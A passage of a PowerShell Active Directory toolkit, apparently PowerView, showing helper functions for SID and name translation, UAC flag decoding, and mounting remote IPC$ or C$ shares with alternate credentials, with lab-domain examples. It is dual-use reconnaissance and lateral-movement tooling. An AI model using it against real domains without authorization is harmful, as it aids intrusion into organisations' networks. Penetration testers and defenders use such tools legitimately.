            $FileMode = [System.IO.FileMode]::Append
        }
        else {
            $FileMode = [System.IO.FileMode]::Create
            $Exists = $False
        }

        $CSVStream = New-Object IO.FileStream($OutputPath, $FileMode, [System.IO.FileAccess]::Write, [IO.FileShare]::Read)
        $CSVWriter = New-Object System.IO.StreamWriter($CSVStream)
        $CSVWriter.AutoFlush = $True
    }

    PROCESS {
        ForEach ($Entry in $InputObject) {
            $ObjectCSV = ConvertTo-Csv -InputObject $Entry -Delimiter $Delimiter -NoTypeInformation

            if (-not $Exists) {
                # output the object field names as well
                $ObjectCSV | ForEach-Object { $CSVWriter.WriteLine($_) }
                $Exists = $True
            }
            else {
                # only output object field data
                $ObjectCSV[1..($ObjectCSV.Length-1)] | ForEach-Object { $CSVWriter.WriteLine($_) }
            }
        }
    }

    END {
        $Mutex.ReleaseMutex()
        $CSVWriter.Dispose()
        $CSVStream.Dispose()
    }
}


function Resolve-IPAddress {
<#
.SYNOPSIS

Resolves a given hostename to its associated IPv4 address.

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: None  

.DESCRIPTION

Resolves a given hostename to its associated IPv4 address using
[Net.Dns]::GetHostEntry(). If no hostname is provided, the default
is the IP address of the localhost.

.EXAMPLE

Resolve-IPAddress -ComputerName SERVER

.EXAMPLE

@("SERVER1", "SERVER2") | Resolve-IPAddress

.INPUTS

String

Accepts one or more IP address strings on the pipeline.

.OUTPUTS

System.Management.Automation.PSCustomObject

A custom PSObject with the ComputerName and IPAddress.
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('System.Management.Automation.PSCustomObject')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $ComputerName = $Env:COMPUTERNAME
    )

    PROCESS {
        ForEach ($Computer in $ComputerName) {
            try {
                @(([Net.Dns]::GetHostEntry($Computer)).AddressList) | ForEach-Object {
                    if ($_.AddressFamily -eq 'InterNetwork') {
                        $Out = New-Object PSObject
                        $Out | Add-Member Noteproperty 'ComputerName' $Computer
                        $Out | Add-Member Noteproperty 'IPAddress' $_.IPAddressToString
                        $Out
                    }
                }
            }
            catch {
                Write-Verbose "[Resolve-IPAddress] Could not resolve $Computer to an IP Address."
            }
        }
    }
}


function ConvertTo-SID {
<#
.SYNOPSIS

Converts a given user/group name to a security identifier (SID).

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: Convert-ADName, Get-DomainObject, Get-Domain  

.DESCRIPTION

Converts a "DOMAIN\username" syntax to a security identifier (SID)
using System.Security.Principal.NTAccount's translate function. If alternate
credentials are supplied, then Get-ADObject is used to try to map the name
to a security identifier.

.PARAMETER ObjectName

The user/group name to convert, can be 'user' or 'DOMAIN\user' format.

.PARAMETER Domain

Specifies the domain to use for the translation, defaults to the current domain.

.PARAMETER Server

Specifies an Active Directory server (domain controller) to bind to for the translation.

.PARAMETER Credential

Specifies an alternate credential to use for the translation.

.EXAMPLE

ConvertTo-SID 'DEV\dfm'

.EXAMPLE

'DEV\dfm','DEV\krbtgt' | ConvertTo-SID

.EXAMPLE

$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)
'TESTLAB\dfm' | ConvertTo-SID -Credential $Cred

.INPUTS

String

Accepts one or more username specification strings on the pipeline.

.OUTPUTS

String

A string representing the SID of the translated name.
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType([String])]
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('Name', 'Identity')]
        [String[]]
        $ObjectName,

        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        $DomainSearcherArguments = @{}
        if ($PSBoundParameters['Domain']) { $DomainSearcherArguments['Domain'] = $Domain }
        if ($PSBoundParameters['Server']) { $DomainSearcherArguments['Server'] = $Server }
        if ($PSBoundParameters['Credential']) { $DomainSearcherArguments['Credential'] = $Credential }
    }

    PROCESS {
        ForEach ($Object in $ObjectName) {
            $Object = $Object -Replace '/','\'

            if ($PSBoundParameters['Credential']) {
                $DN = Convert-ADName -Identity $Object -OutputType 'DN' @DomainSearcherArguments
                if ($DN) {
                    $UserDomain = $DN.SubString($DN.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                    $UserName = $DN.Split(',')[0].split('=')[1]

                    $DomainSearcherArguments['Identity'] = $UserName
                    $DomainSearcherArguments['Domain'] = $UserDomain
                    $DomainSearcherArguments['Properties'] = 'objectsid'
                    Get-DomainObject @DomainSearcherArguments | Select-Object -Expand objectsid
                }
            }
            else {
                try {
                    if ($Object.Contains('\')) {
                        $Domain = $Object.Split('\')[0]
                        $Object = $Object.Split('\')[1]
                    }
                    elseif (-not $PSBoundParameters['Domain']) {
                        $DomainSearcherArguments = @{}
                        $Domain = (Get-Domain @DomainSearcherArguments).Name
                    }

                    $Obj = (New-Object System.Security.Principal.NTAccount($Domain, $Object))
                    $Obj.Translate([System.Security.Principal.SecurityIdentifier]).Value
                }
                catch {
                    Write-Verbose "[ConvertTo-SID] Error converting $Domain\$Object : $_"
                }
            }
        }
    }
}


function ConvertFrom-SID {
<#
.SYNOPSIS

Converts a security identifier (SID) to a group/user name.

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: Convert-ADName  

.DESCRIPTION

Converts a security identifier string (SID) to a group/user name
using Convert-ADName.

.PARAMETER ObjectSid

Specifies one or more SIDs to convert.

.PARAMETER Domain

Specifies the domain to use for the translation, defaults to the current domain.

.PARAMETER Server

Specifies an Active Directory server (domain controller) to bind to for the translation.

.PARAMETER Credential

Specifies an alternate credential to use for the translation.

.EXAMPLE

ConvertFrom-SID S-1-5-21-890171859-3433809279-3366196753-1108

TESTLAB\harmj0y

.EXAMPLE

"S-1-5-21-890171859-3433809279-3366196753-1107", "S-1-5-21-890171859-3433809279-3366196753-1108", "S-1-5-32-562" | ConvertFrom-SID

TESTLAB\WINDOWS2$
TESTLAB\harmj0y
BUILTIN\Distributed COM Users

.EXAMPLE

$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm', $SecPassword)
ConvertFrom-SID S-1-5-21-890171859-3433809279-3366196753-1108 -Credential $Cred

TESTLAB\harmj0y

.INPUTS

String

Accepts one or more SID strings on the pipeline.

.OUTPUTS

String

The converted DOMAIN\username.
#>

    [OutputType([String])]
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('SID')]
        [ValidatePattern('^S-1-.*')]
        [String[]]
        $ObjectSid,

        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        $ADNameArguments = @{}
        if ($PSBoundParameters['Domain']) { $ADNameArguments['Domain'] = $Domain }
        if ($PSBoundParameters['Server']) { $ADNameArguments['Server'] = $Server }
        if ($PSBoundParameters['Credential']) { $ADNameArguments['Credential'] = $Credential }
    }

    PROCESS {
        ForEach ($TargetSid in $ObjectSid) {
            $TargetSid = $TargetSid.trim('*')
            try {
                # try to resolve any built-in SIDs first - https://support.microsoft.com/en-us/kb/243330
                Switch ($TargetSid) {
                    'S-1-0'         { 'Null Authority' }
                    'S-1-0-0'       { 'Nobody' }
                    'S-1-1'         { 'World Authority' }
                    'S-1-1-0'       { 'Everyone' }
                    'S-1-2'         { 'Local Authority' }
                    'S-1-2-0'       { 'Local' }
                    'S-1-2-1'       { 'Console Logon ' }
                    'S-1-3'         { 'Creator Authority' }
                    'S-1-3-0'       { 'Creator Owner' }
                    'S-1-3-1'       { 'Creator Group' }
                    'S-1-3-2'       { 'Creator Owner Server' }
                    'S-1-3-3'       { 'Creator Group Server' }
                    'S-1-3-4'       { 'Owner Rights' }
                    'S-1-4'         { 'Non-unique Authority' }
                    'S-1-5'         { 'NT Authority' }
                    'S-1-5-1'       { 'Dialup' }
                    'S-1-5-2'       { 'Network' }
                    'S-1-5-3'       { 'Batch' }
                    'S-1-5-4'       { 'Interactive' }
                    'S-1-5-6'       { 'Service' }
                    'S-1-5-7'       { 'Anonymous' }
                    'S-1-5-8'       { 'Proxy' }
                    'S-1-5-9'       { 'Enterprise Domain Controllers' }
                    'S-1-5-10'      { 'Principal Self' }
                    'S-1-5-11'      { 'Authenticated Users' }
                    'S-1-5-12'      { 'Restricted Code' }
                    'S-1-5-13'      { 'Terminal Server Users' }
                    'S-1-5-14'      { 'Remote Interactive Logon' }
                    'S-1-5-15'      { 'This Organization ' }
                    'S-1-5-17'      { 'This Organization ' }
                    'S-1-5-18'      { 'Local System' }
                    'S-1-5-19'      { 'NT Authority' }
                    'S-1-5-20'      { 'NT Authority' }
                    'S-1-5-80-0'    { 'All Services ' }
                    'S-1-5-32-544'  { 'BUILTIN\Administrators' }
                    'S-1-5-32-545'  { 'BUILTIN\Users' }
                    'S-1-5-32-546'  { 'BUILTIN\Guests' }
                    'S-1-5-32-547'  { 'BUILTIN\Power Users' }
                    'S-1-5-32-548'  { 'BUILTIN\Account Operators' }
                    'S-1-5-32-549'  { 'BUILTIN\Server Operators' }
                    'S-1-5-32-550'  { 'BUILTIN\Print Operators' }
                    'S-1-5-32-551'  { 'BUILTIN\Backup Operators' }
                    'S-1-5-32-552'  { 'BUILTIN\Replicators' }
                    'S-1-5-32-554'  { 'BUILTIN\Pre-Windows 2000 Compatible Access' }
                    'S-1-5-32-555'  { 'BUILTIN\Remote Desktop Users' }
                    'S-1-5-32-556'  { 'BUILTIN\Network Configuration Operators' }
                    'S-1-5-32-557'  { 'BUILTIN\Incoming Forest Trust Builders' }
                    'S-1-5-32-558'  { 'BUILTIN\Performance Monitor Users' }
                    'S-1-5-32-559'  { 'BUILTIN\Performance Log Users' }
                    'S-1-5-32-560'  { 'BUILTIN\Windows Authorization Access Group' }
                    'S-1-5-32-561'  { 'BUILTIN\Terminal Server License Servers' }
                    'S-1-5-32-562'  { 'BUILTIN\Distributed COM Users' }
                    'S-1-5-32-569'  { 'BUILTIN\Cryptographic Operators' }
                    'S-1-5-32-573'  { 'BUILTIN\Event Log Readers' }
                    'S-1-5-32-574'  { 'BUILTIN\Certificate Service DCOM Access' }
                    'S-1-5-32-575'  { 'BUILTIN\RDS Remote Access Servers' }
                    'S-1-5-32-576'  { 'BUILTIN\RDS Endpoint Servers' }
                    'S-1-5-32-577'  { 'BUILTIN\RDS Management Servers' }
                    'S-1-5-32-578'  { 'BUILTIN\Hyper-V Administrators' }
                    'S-1-5-32-579'  { 'BUILTIN\Access Control Assistance Operators' }
                    'S-1-5-32-580'  { 'BUILTIN\Access Control Assistance Operators' }
                    Default {
                        Convert-ADName -Identity $TargetSid @ADNameArguments
                    }
                }
            }
            catch {
                Write-Verbose "[ConvertFrom-SID] Error converting SID '$TargetSid' : $_"
            }
        }
    }
}


function Convert-ADName {
<#
.SYNOPSIS

Converts Active Directory object names between a variety of formats.

Author: Bill Stewart, Pasquale Lantella  
Modifications: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: None  

.DESCRIPTION

This function is heavily based on Bill Stewart's code and Pasquale Lantella's code (in LINK)
and translates Active Directory names between various formats using the NameTranslate COM object.

.PARAMETER Identity

Specifies the Active Directory object name to translate, of the following form:

    DN                short for 'distinguished name'; e.g., 'CN=Phineas Flynn,OU=Engineers,DC=fabrikam,DC=com'
    Canonical         canonical name; e.g., 'fabrikam.com/Engineers/Phineas Flynn'
    NT4               domain\username; e.g., 'fabrikam\pflynn'
    Display           display name, e.g. 'pflynn'
    DomainSimple      simple domain name format, e.g. 'pflynn@fabrikam.com'
    EnterpriseSimple  simple enterprise name format, e.g. 'pflynn@fabrikam.com'
    GUID              GUID; e.g., '{95ee9fff-3436-11d1-b2b0-d15ae3ac8436}'
    UPN               user principal name; e.g., 'pflynn@fabrikam.com'
    CanonicalEx       extended canonical name format
    SPN               service principal name format; e.g. 'HTTP/kairomac.contoso.com'
    SID               Security Identifier; e.g., 'S-1-5-21-12986231-600641547-709122288-57999'

.PARAMETER OutputType

Specifies the output name type you want to convert to, which must be one of the following:

    DN                short for 'distinguished name'; e.g., 'CN=Phineas Flynn,OU=Engineers,DC=fabrikam,DC=com'
    Canonical         canonical name; e.g., 'fabrikam.com/Engineers/Phineas Flynn'
    NT4               domain\username; e.g., 'fabrikam\pflynn'
    Display           display name, e.g. 'pflynn'
    DomainSimple      simple domain name format, e.g. 'pflynn@fabrikam.com'
    EnterpriseSimple  simple enterprise name format, e.g. 'pflynn@fabrikam.com'
    GUID              GUID; e.g., '{95ee9fff-3436-11d1-b2b0-d15ae3ac8436}'
    UPN               user principal name; e.g., 'pflynn@fabrikam.com'
    CanonicalEx       extended canonical name format, e.g. 'fabrikam.com/Users/Phineas Flynn'
    SPN               service principal name format; e.g. 'HTTP/kairomac.contoso.com'

.PARAMETER Domain

Specifies the domain to use for the translation, defaults to the current domain.

.PARAMETER Server

Specifies an Active Directory server (domain controller) to bind to for the translation.

.PARAMETER Credential

Specifies an alternate credential to use for the translation.

.EXAMPLE

Convert-ADName -Identity "TESTLAB\harmj0y"

harmj0y@testlab.local

.EXAMPLE

"TESTLAB\krbtgt", "CN=Administrator,CN=Users,DC=testlab,DC=local" | Convert-ADName -OutputType Canonical

testlab.local/Users/krbtgt
testlab.local/Users/Administrator

.EXAMPLE

Convert-ADName -OutputType dn -Identity 'TESTLAB\harmj0y' -Server PRIMARY.testlab.local

CN=harmj0y,CN=Users,DC=testlab,DC=local

.EXAMPLE

$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm', $SecPassword)
'S-1-5-21-890171859-3433809279-3366196753-1108' | Convert-ADNAme -Credential $Cred

TESTLAB\harmj0y

.INPUTS

String

Accepts one or more objects name strings on the pipeline.

.OUTPUTS

String

Outputs a string representing the converted name.

.LINK

http://windowsitpro.com/active-directory/translating-active-directory-object-names-between-formats
https://gallery.technet.microsoft.com/scriptcenter/Translating-Active-5c80dd67
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseShouldProcessForStateChangingFunctions', '')]
    [OutputType([String])]
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('Name', 'ObjectName')]
        [String[]]
        $Identity,

        [String]
        [ValidateSet('DN', 'Canonical', 'NT4', 'Display', 'DomainSimple', 'EnterpriseSimple', 'GUID', 'Unknown', 'UPN', 'CanonicalEx', 'SPN')]
        $OutputType,

        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        $NameTypes = @{
            'DN'                =   1  # CN=Phineas Flynn,OU=Engineers,DC=fabrikam,DC=com
            'Canonical'         =   2  # fabrikam.com/Engineers/Phineas Flynn
            'NT4'               =   3  # fabrikam\pflynn
            'Display'           =   4  # pflynn
            'DomainSimple'      =   5  # pflynn@fabrikam.com
            'EnterpriseSimple'  =   6  # pflynn@fabrikam.com
            'GUID'              =   7  # {95ee9fff-3436-11d1-b2b0-d15ae3ac8436}
            'Unknown'           =   8  # unknown type - let the server do translation
            'UPN'               =   9  # pflynn@fabrikam.com
            'CanonicalEx'       =   10 # fabrikam.com/Users/Phineas Flynn
            'SPN'               =   11 # HTTP/kairomac.contoso.com
            'SID'               =   12 # S-1-5-21-12986231-600641547-709122288-57999
        }

        # accessor functions from Bill Stewart to simplify calls to NameTranslate
        function Invoke-Method([__ComObject] $Object, [String] $Method, $Parameters) {
            $Output = $Null
            $Output = $Object.GetType().InvokeMember($Method, 'InvokeMethod', $NULL, $Object, $Parameters)
            Write-Output $Output
        }

        function Get-Property([__ComObject] $Object, [String] $Property) {
            $Object.GetType().InvokeMember($Property, 'GetProperty', $NULL, $Object, $NULL)
        }

        function Set-Property([__ComObject] $Object, [String] $Property, $Parameters) {
            [Void] $Object.GetType().InvokeMember($Property, 'SetProperty', $NULL, $Object, $Parameters)
        }

        # https://msdn.microsoft.com/en-us/library/aa772266%28v=vs.85%29.aspx
        if ($PSBoundParameters['Server']) {
            $ADSInitType = 2
            $InitName = $Server
        }
        elseif ($PSBoundParameters['Domain']) {
            $ADSInitType = 1
            $InitName = $Domain
        }
        elseif ($PSBoundParameters['Credential']) {
            $Cred = $Credential.GetNetworkCredential()
            $ADSInitType = 1
            $InitName = $Cred.Domain
        }
        else {
            # if no domain or server is specified, default to GC initialization
            $ADSInitType = 3
            $InitName = $Null
        }
    }

    PROCESS {
        ForEach ($TargetIdentity in $Identity) {
            if (-not $PSBoundParameters['OutputType']) {
                if ($TargetIdentity -match "^[A-Za-z]+\\[A-Za-z ]+") {
                    $ADSOutputType = $NameTypes['DomainSimple']
                }
                else {
                    $ADSOutputType = $NameTypes['NT4']
                }
            }
            else {
                $ADSOutputType = $NameTypes[$OutputType]
            }

            $Translate = New-Object -ComObject NameTranslate

            if ($PSBoundParameters['Credential']) {
                try {
                    $Cred = $Credential.GetNetworkCredential()

                    Invoke-Method $Translate 'InitEx' (
                        $ADSInitType,
                        $InitName,
                        $Cred.UserName,
                        $Cred.Domain,
                        $Cred.Password
                    )
                }
                catch {
                    Write-Verbose "[Convert-ADName] Error initializing translation for '$Identity' using alternate credentials : $_"
                }
            }
            else {
                try {
                    $Null = Invoke-Method $Translate 'Init' (
                        $ADSInitType,
                        $InitName
                    )
                }
                catch {
                    Write-Verbose "[Convert-ADName] Error initializing translation for '$Identity' : $_"
                }
            }

            # always chase all referrals
            Set-Property $Translate 'ChaseReferral' (0x60)

            try {
                # 8 = Unknown name type -> let the server do the work for us
                $Null = Invoke-Method $Translate 'Set' (8, $TargetIdentity)
                Invoke-Method $Translate 'Get' ($ADSOutputType)
            }
            catch [System.Management.Automation.MethodInvocationException] {
                Write-Verbose "[Convert-ADName] Error translating '$TargetIdentity' : $($_.Exception.InnerException.Message)"
            }
        }
    }
}


function ConvertFrom-UACValue {
<#
.SYNOPSIS

Converts a UAC int value to human readable form.

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: None  

.DESCRIPTION

This function will take an integer that represents a User Account
Control (UAC) binary blob and will covert it to an ordered
dictionary with each bitwise value broken out. By default only values
set are displayed- the -ShowAll switch will display all values with
a + next to the ones set.

.PARAMETER Value

Specifies the integer UAC value to convert.

.PARAMETER ShowAll

Switch. Signals ConvertFrom-UACValue to display all UAC values, with a + indicating the value is currently set.

.EXAMPLE

ConvertFrom-UACValue -Value 66176

Name                           Value
----                           -----
ENCRYPTED_TEXT_PWD_ALLOWED     128
NORMAL_ACCOUNT                 512
DONT_EXPIRE_PASSWORD           65536

.EXAMPLE

Get-DomainUser harmj0y | ConvertFrom-UACValue

Name                           Value
----                           -----
NORMAL_ACCOUNT                 512
DONT_EXPIRE_PASSWORD           65536

.EXAMPLE

Get-DomainUser harmj0y | ConvertFrom-UACValue -ShowAll

Name                           Value
----                           -----
SCRIPT                         1
ACCOUNTDISABLE                 2
HOMEDIR_REQUIRED               8
LOCKOUT                        16
PASSWD_NOTREQD                 32
PASSWD_CANT_CHANGE             64
ENCRYPTED_TEXT_PWD_ALLOWED     128
TEMP_DUPLICATE_ACCOUNT         256
NORMAL_ACCOUNT                 512+
INTERDOMAIN_TRUST_ACCOUNT      2048
WORKSTATION_TRUST_ACCOUNT      4096
SERVER_TRUST_ACCOUNT           8192
DONT_EXPIRE_PASSWORD           65536+
MNS_LOGON_ACCOUNT              131072
SMARTCARD_REQUIRED             262144
TRUSTED_FOR_DELEGATION         524288
NOT_DELEGATED                  1048576
USE_DES_KEY_ONLY               2097152
DONT_REQ_PREAUTH               4194304
PASSWORD_EXPIRED               8388608
TRUSTED_TO_AUTH_FOR_DELEGATION 16777216
PARTIAL_SECRETS_ACCOUNT        67108864

.INPUTS

Int

Accepts an integer representing a UAC binary blob.

.OUTPUTS

System.Collections.Specialized.OrderedDictionary

An ordered dictionary with the converted UAC fields.

.LINK

https://support.microsoft.com/en-us/kb/305144
#>

    [OutputType('System.Collections.Specialized.OrderedDictionary')]
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('UAC', 'useraccountcontrol')]
        [Int]
        $Value,

        [Switch]
        $ShowAll
    )

    BEGIN {
        # values from https://support.microsoft.com/en-us/kb/305144
        $UACValues = New-Object System.Collections.Specialized.OrderedDictionary
        $UACValues.Add("SCRIPT", 1)
        $UACValues.Add("ACCOUNTDISABLE", 2)
        $UACValues.Add("HOMEDIR_REQUIRED", 8)
        $UACValues.Add("LOCKOUT", 16)
        $UACValues.Add("PASSWD_NOTREQD", 32)
        $UACValues.Add("PASSWD_CANT_CHANGE", 64)
        $UACValues.Add("ENCRYPTED_TEXT_PWD_ALLOWED", 128)
        $UACValues.Add("TEMP_DUPLICATE_ACCOUNT", 256)
        $UACValues.Add("NORMAL_ACCOUNT", 512)
        $UACValues.Add("INTERDOMAIN_TRUST_ACCOUNT", 2048)
        $UACValues.Add("WORKSTATION_TRUST_ACCOUNT", 4096)
        $UACValues.Add("SERVER_TRUST_ACCOUNT", 8192)
        $UACValues.Add("DONT_EXPIRE_PASSWORD", 65536)
        $UACValues.Add("MNS_LOGON_ACCOUNT", 131072)
        $UACValues.Add("SMARTCARD_REQUIRED", 262144)
        $UACValues.Add("TRUSTED_FOR_DELEGATION", 524288)
        $UACValues.Add("NOT_DELEGATED", 1048576)
        $UACValues.Add("USE_DES_KEY_ONLY", 2097152)
        $UACValues.Add("DONT_REQ_PREAUTH", 4194304)
        $UACValues.Add("PASSWORD_EXPIRED", 8388608)
        $UACValues.Add("TRUSTED_TO_AUTH_FOR_DELEGATION", 16777216)
        $UACValues.Add("PARTIAL_SECRETS_ACCOUNT", 67108864)
    }

    PROCESS {
        $ResultUACValues = New-Object System.Collections.Specialized.OrderedDictionary

        if ($ShowAll) {
            ForEach ($UACValue in $UACValues.GetEnumerator()) {
                if ( ($Value -band $UACValue.Value) -eq $UACValue.Value) {
                    $ResultUACValues.Add($UACValue.Name, "$($UACValue.Value)+")
                }
                else {
                    $ResultUACValues.Add($UACValue.Name, "$($UACValue.Value)")
                }
            }
        }
        else {
            ForEach ($UACValue in $UACValues.GetEnumerator()) {
                if ( ($Value -band $UACValue.Value) -eq $UACValue.Value) {
                    $ResultUACValues.Add($UACValue.Name, "$($UACValue.Value)")
                }
            }
        }
        $ResultUACValues
    }
}


function Get-PrincipalContext {
<#
.SYNOPSIS

Helper to take an Identity and return a DirectoryServices.AccountManagement.PrincipalContext
and simplified identity.

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: None  

.PARAMETER Identity

A group SamAccountName (e.g. Group1), DistinguishedName (e.g. CN=group1,CN=Users,DC=testlab,DC=local),
SID (e.g. S-1-5-21-890171859-3433809279-3366196753-1114), or GUID (e.g. 4c435dd7-dc58-4b14-9a5e-1fdb0e80d202),
or a DOMAIN\username identity.

.PARAMETER Domain

Specifies the domain to use to search for user/group principals, defaults to the current domain.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
for connection to the target domain.
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, Mandatory = $True)]
        [Alias('GroupName', 'GroupIdentity')]
        [String]
        $Identity,

        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    Add-Type -AssemblyName System.DirectoryServices.AccountManagement

    try {
        if ($PSBoundParameters['Domain'] -or ($Identity -match '.+\\.+')) {
            if ($Identity -match '.+\\.+') {
                # DOMAIN\groupname
                $ConvertedIdentity = $Identity | Convert-ADName -OutputType Canonical
                if ($ConvertedIdentity) {
                    $ConnectTarget = $ConvertedIdentity.SubString(0, $ConvertedIdentity.IndexOf('/'))
                    $ObjectIdentity = $Identity.Split('\')[1]
                    Write-Verbose "[Get-PrincipalContext] Binding to domain '$ConnectTarget'"
                }
            }
            else {
                $ObjectIdentity = $Identity
                Write-Verbose "[Get-PrincipalContext] Binding to domain '$Domain'"
                $ConnectTarget = $Domain
            }

            if ($PSBoundParameters['Credential']) {
                Write-Verbose '[Get-PrincipalContext] Using alternate credentials'
                $Context = New-Object -TypeName System.DirectoryServices.AccountManagement.PrincipalContext -ArgumentList ([System.DirectoryServices.AccountManagement.ContextType]::Domain, $ConnectTarget, $Credential.UserName, $Credential.GetNetworkCredential().Password)
            }
            else {
                $Context = New-Object -TypeName System.DirectoryServices.AccountManagement.PrincipalContext -ArgumentList ([System.DirectoryServices.AccountManagement.ContextType]::Domain, $ConnectTarget)
            }
        }
        else {
            if ($PSBoundParameters['Credential']) {
                Write-Verbose '[Get-PrincipalContext] Using alternate credentials'
                $DomainName = Get-Domain | Select-Object -ExpandProperty Name
                $Context = New-Object -TypeName System.DirectoryServices.AccountManagement.PrincipalContext -ArgumentList ([System.DirectoryServices.AccountManagement.ContextType]::Domain, $DomainName, $Credential.UserName, $Credential.GetNetworkCredential().Password)
            }
            else {
                $Context = New-Object -TypeName System.DirectoryServices.AccountManagement.PrincipalContext -ArgumentList ([System.DirectoryServices.AccountManagement.ContextType]::Domain)
            }
            $ObjectIdentity = $Identity
        }

        $Out = New-Object PSObject
        $Out | Add-Member Noteproperty 'Context' $Context
        $Out | Add-Member Noteproperty 'Identity' $ObjectIdentity
        $Out
    }
    catch {
        Write-Warning "[Get-PrincipalContext] Error creating binding for object ('$Identity') context : $_"
    }
}


function Add-RemoteConnection {
<#
.SYNOPSIS

Pseudo "mounts" a connection to a remote path using the specified
credential object, allowing for access of remote resources. If a -Path isn't
specified, a -ComputerName is required to pseudo-mount IPC$.

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: PSReflect  

.DESCRIPTION

This function uses WNetAddConnection2W to make a 'temporary' (i.e. not saved) connection
to the specified remote -Path (\\UNC\share) with the alternate credentials specified in the
-Credential object. If a -Path isn't specified, a -ComputerName is required to pseudo-mount IPC$.

To destroy the connection, use Remove-RemoteConnection with the same specified \\UNC\share path
or -ComputerName.

.PARAMETER ComputerName

Specifies the system to add a \\ComputerName\IPC$ connection for.

.PARAMETER Path

Specifies the remote \\UNC\path to add the connection for.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
for connection to the remote system.

.EXAMPLE

$Cred = Get-Credential
Add-RemoteConnection -ComputerName 'PRIMARY.testlab.local' -Credential $Cred

.EXAMPLE

$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)
Add-RemoteConnection -Path '\\PRIMARY.testlab.local\C$\' -Credential $Cred

.EXAMPLE

$Cred = Get-Credential
@('PRIMARY.testlab.local','SECONDARY.testlab.local') | Add-RemoteConnection  -Credential $Cred
#>

    [CmdletBinding(DefaultParameterSetName = 'ComputerName')]
    Param(
        [Parameter(Position = 0, Mandatory = $True, ParameterSetName = 'ComputerName', ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $ComputerName,

        [Parameter(Position = 0, ParameterSetName = 'Path', Mandatory = $True)]
        [ValidatePattern('\\\\.*\\.*')]
        [String[]]
        $Path,

        [Parameter(Mandatory = $True)]
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential
    )

    BEGIN {
        $NetResourceInstance = [Activator]::CreateInstance($NETRESOURCEW)
        $NetResourceInstance.dwType = 1
    }

    PROCESS {
        $Paths = @()
        if ($PSBoundParameters['ComputerName']) {
            ForEach ($TargetComputerName in $ComputerName) {
                $TargetComputerName = $TargetComputerName.Trim('\')
                $Paths += ,"\\$TargetComputerName\IPC$"
            }
        }
        else {
            $Paths += ,$Path
        }

        ForEach ($TargetPath in $Paths) {
            $NetResourceInstance.lpRemoteName = $TargetPath
            Write-Verbose "[Add-RemoteConnection] Attempting to mount: $TargetPath"

            # https://msdn.microsoft.com/en-us/library/windows/desktop/aa385413(v=vs.85).aspx
            #   CONNECT_TEMPORARY = 4
            $Result = $Mpr::WNetAddConnection2W($NetResourceInstance, $Credential.GetNetworkCredential().Password, $Credential.UserName, 4)

            if ($Result -eq 0) {
                Write-Verbose "$TargetPath successfully mounted"
            }
            else {
                Throw "[Add-RemoteConnection] error mounting $TargetPath : $(([ComponentModel.Win32Exception]$Result).Message)"
            }
        }
    }
}


function Remove-RemoteConnection {
<#
.SYNOPSIS

Destroys a connection created by New-RemoteConnection.

Author: Will Schroeder (@harmj0y)  
